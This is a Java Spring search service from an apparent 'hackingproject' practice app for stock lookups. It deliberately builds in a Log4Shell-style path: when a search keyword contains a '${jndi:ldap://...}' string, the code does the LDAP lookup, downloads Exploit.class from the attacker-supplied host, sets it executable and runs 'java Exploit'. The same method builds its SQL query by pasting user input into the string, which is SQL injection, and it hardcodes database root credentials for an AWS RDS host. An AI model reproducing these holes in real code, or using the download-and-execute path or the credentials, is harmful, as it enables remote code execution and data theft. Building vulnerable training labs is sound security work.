package com.example.hackingproject.search.service;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

import java.io.File;
import java.net.URLClassLoader;
import java.lang.reflect.Method;

import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import org.springframework.stereotype.Service;


import com.example.hackingproject.login.LoginRestAPIController;
import com.example.hackingproject.search.vo.searchVO;
import com.example.hackingproject.stock.vo.StockVO;

import javax.xml.transform.Result;
import java.util.List;
import java.util.ArrayList;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;


@Service
public class searchService {


	public void downloadFileFromURL(String fileUrl, String saveDir) {
	    try {
	        URL url = new URL(fileUrl);
	        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
	        int responseCode = httpConn.getResponseCode();

	        // HTTP OK를 확인
	        if (responseCode == HttpURLConnection.HTTP_OK) {
	            String fileName = "";
	            String disposition = httpConn.getHeaderField("Content-Disposition");

	            if (disposition != null) {
	                // 파일 이름을 Content-Disposition 헤더에서 추출
	                int index = disposition.indexOf("filename=");
	                if (index > 0) {
	                    fileName = disposition.substring(index + 10, disposition.length() - 1);
	                }
	            } else {
	                // 파일 이름을 URL에서 추출
	                fileName = fileUrl.substring(fileUrl.lastIndexOf("/") + 1);
	            }
	            
	            
	            // 입력 스트림을 통해 파일을 읽고 저장
	            InputStream inputStream = httpConn.getInputStream();
	            FileOutputStream outputStream = new FileOutputStream(saveDir + fileName);

	            int bytesRead;
	            byte[] buffer = new byte[4096];
	            while ((bytesRead = inputStream.read(buffer)) != -1) {
	                outputStream.write(buffer, 0, bytesRead);
	            }

	            outputStream.close();
	            inputStream.close();
	            
	            //System.out.println("File downloaded");
	            File file = new File(saveDir + fileName);
	            
	            String command = "chmod 755 " + file.getAbsolutePath();
	            Process proc = Runtime.getRuntime().exec(command);
	            proc.waitFor();
	            
	            Process proc1 = Runtime.getRuntime().exec("java Exploit");
	            proc1.waitFor();
	            //System.out.println(saveDir + fileName);
	            
	            //System.out.println("asdfadsfadsfasdfd"+saveDir + fileName);
	            //System.out.println("Permissions set: chmod 755 " + file.getAbsolutePath());
	            //System.out.println("Permissions set: chmod 755 Exploit.class" );
	            
	            // 파일 로드 및 실행
	            
	            //System.out.println("File downloaded: " + file.getAbsolutePath());
	            URL classUrl = file.toURI().toURL(); // 파일을 URL로 변환
	            //System.out.println("Class URL: " + classUrl);
	            
	        } else {
	            System.out.println("No file to download. Server replied HTTP code: " + responseCode);
	        }
	        httpConn.disconnect();
	    } catch (Exception e) {
	        System.out.println("Error downloading the file: " + e.getMessage());
	        e.printStackTrace();
	    }
	}

	
	private static final Logger logger = LogManager.getLogger(searchService.class);

	public List<StockVO> search(searchVO key) {
        List<StockVO> stockList = new ArrayList<>();
        String url = "jdbc:mysql://rds-17-hack.cggbeg5i6y5t.eu-north-1.rds.amazonaws.com/rookie"; // 데이터베이스 URL
        String username = "root"; // 사용자 이름
        String password = "k44g20!!"; // 비밀번호
        
        String log4jVersion = LogManager.getLogger(Logger.class).getClass().getPackage().getImplementationVersion();
        String keyword = key.getKeywords();
        String userInput = "${jndi:ldap://192.168.14.28:1389/a}";
        String jndiLookupString = "${jndi:ldap://192.168.14.28:1389/dc=example,dc=com}";
        String syntax="ldap://192.168.14.28:1389";
        
        logger.info(keyword);
        logger.debug(keyword);
        logger.error(keyword);
        String[] word = keyword.split("\\$\\{jndi:");
        if(keyword.contains("{jndi:")) {
        	
        	
        	//System.out.println(word[1]);
        	String syn = word[1].replace("}", "");
        	
        	int idx = syn.lastIndexOf("/");
        	if(idx != -1) {
        		syntax = syn.substring(0, idx);
        	}
        	//System.out.println("syntax : "+ syntax);//
        	
        	String redirect_add = syntax.replace("ldap://","");
        	redirect_add = redirect_add.replace(":1389","");
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.PROVIDER_URL, syntax +"/dc=example,dc=com");
            
            String jndiPath = syntax +"/dc=example,dc=com";

            try {
                DirContext ctx = new InitialDirContext(env);
               // System.out.println("Connected to the LDAP server.");
                // LDAP 서버에서 데이터를 조회하거나 조작하는 코드 추가
                ctx.close();
            } catch (NamingException e) {
                System.out.println("Cannot connect to LDAP server: " + e.getMessage());
            }

            //System.out.println("jndiPath : "+ jndiPath);//
            
            // 환경 설정
            Hashtable<String, String> env1 = new Hashtable<>();
            env1.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env1.put(Context.PROVIDER_URL, jndiPath);
            
            try {
                // InitialContext 생성 및 Lookup 수행
                Context ctx = new InitialContext(env1);
                Object obj = ctx.lookup(jndiPath);
                
                //System.out.println("Object obtained from JNDI: " + obj);//
                
                
                //System.out.println(redirect_add);
                String fileUrl = "http://"+redirect_add+":8000/Exploit.class"; // 리다이렉션된 URL
                
                String currentDir = System.getProperty("user.dir");
                String savePath = currentDir+"/"; // 파일을 저장할 경로
                //System.out.println("Current working directory: " + currentDir);
                downloadFileFromURL(fileUrl, savePath);

                // Context 사용 후 닫기
                ctx.close();
            } catch (NamingException e) {
                System.err.println("Error during JNDI Lookup: " + e.getMessage());
                e.printStackTrace();
            }

        }
        


        
        //
        
        try (Connection conn = DriverManager.getConnection(url, username, password);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT sp.* FROM Stock_Price sp JOIN (SELECT stock_name, MAX(stock_date) AS max_date FROM Stock_Price WHERE stock_name LIKE '%" + key.getKeywords() + "%' GROUP BY stock_name) AS max_dates ON sp.stock_name = max_dates.stock_name AND sp.stock_date = max_dates.max_date")) {

            // 여기서부터 while 루프 시작
            while (rs.next()) {
                StockVO stock = new StockVO();
                stock.setSTOCK_NAME(rs.getString("stock_name"));
                stock.setSTOCK_CODE(rs.getString("stock_code"));
                stock.setSTOCK_PRICE(rs.getInt("stock_price"));

                stockList.add(stock);
            }
            // while 루프 종료
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return stockList;
	}

}
